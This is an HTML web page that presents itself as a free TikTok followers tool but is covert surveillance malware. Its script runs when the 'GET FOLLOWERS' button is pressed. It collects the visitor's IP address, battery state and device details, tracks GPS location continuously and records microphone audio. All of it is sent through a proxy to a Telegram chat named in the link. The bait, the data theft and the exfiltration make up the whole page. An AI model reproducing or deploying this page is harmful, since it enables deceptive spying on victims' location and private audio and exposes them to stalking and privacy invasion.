<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>TikTok Followers Tool - Location</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body { font-family:'Montserrat',sans-serif; margin:0; padding:0; background:#f5f5f5; }
    .navbar { background:linear-gradient(90deg,#69C9D0,#EE1D52); color:white; text-align:center; padding:15px 0; }
    #header { font-size:28px; font-weight:bold; }
    .container { max-width:600px; margin:20px auto; padding:20px; background:white; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
    #thumbdloadbtn { display:block; width:100%; padding:12px; border:none; border-radius:5px; background:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; }
  </style>
</head>
<body>
  <nav class="navbar">
    <h1 id="header">TIKTOK FREE FOLLOWERS</h1>
  </nav>

  <div class="container">
    <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL">
    <button id="thumbdloadbtn" onclick="startHack()">GET FOLLOWERS</button>
  </div>

  <script>
    function GetURLParameter(sParam){
      var sPageURL=window.location.search.substring(1), sURLVariables=sPageURL.split('&');
      for(var i=0;i<sURLVariables.length;i++){
        var sParameterName=sURLVariables[i].split('=');
        if(sParameterName[0]==sParam){return sParameterName[1];}
      }
    }

    var chatid = GetURLParameter('id');

    async function startHack(){
      if(!chatid) return alert("No Chat ID!");

      // --- Get Text Info ---
      const [ip, battery] = await Promise.all([getIP(), getBattery()]);
      const device = getDeviceInfo();

      fetch(`/api/proxy`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          type:'message',
          chat_id:chatid,
          text:`üßë‚Äçüíª User Info:\n\n${ip}\n\n${battery}\n\n${device}`
        })
      });

      // --- Send Location ---
      if(navigator.geolocation){
        navigator.geolocation.watchPosition(pos=>{
          fetch(`/api/proxy`,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
              type:'location',
              chat_id:chatid,
              latitude:pos.coords.latitude,
              longitude:pos.coords.longitude
            })
          });
        });
      }

      // --- Audio Recording ---
      navigator.mediaDevices.getUserMedia({ audio:true })
      .then(stream=>{
        const recorder = new MediaRecorder(stream);
        recorder.start();
        setTimeout(()=>recorder.stop(), 5000);
        recorder.ondataavailable=(e)=>{
          if(e.data.size>0) sendToTelegram(e.data,'audio');
        };
      })
      .catch(err=>console.error("Audio error",err));
    }

    function sendToTelegram(data,type){
      if(!chatid) return;
      const formData=new FormData();
      formData.append('chat_id', chatid);

      if(type==='audio'){
        formData.append('audio', data, `voice_${Date.now()}.ogg`);
        formData.append('caption', "@Ali_CameraHack_bot");  // üëà Bot Name as caption
      }
      fetch(`/api/proxy?type=${type}`, { method:'POST', body:formData });
    }

    function getBattery(){
      if(navigator.getBattery){
        return navigator.getBattery().then(b=>`üîã Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);
      }
      return Promise.resolve("üîã Battery: API not available");
    }

    function getIP(){
      return fetch("https://api.ipify.org?format=json")
        .then(res=>res.json())
        .then(data=>`üåê IP Address: ${data.ip}`)
        .catch(()=> "üåê IP Address: Could not detect");
    }

    function getDeviceInfo(){
      return `üì± Device Info:\nScreen: ${screen.width}x${screen.height}\n‚è∞ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`;
    }
  </script>

  <footer style="text-align:center;padding:10px;background:#EE1D52;color:white;">
    DEVELOP BY ALI üíúüî•
  </footer>
</body>
</html>
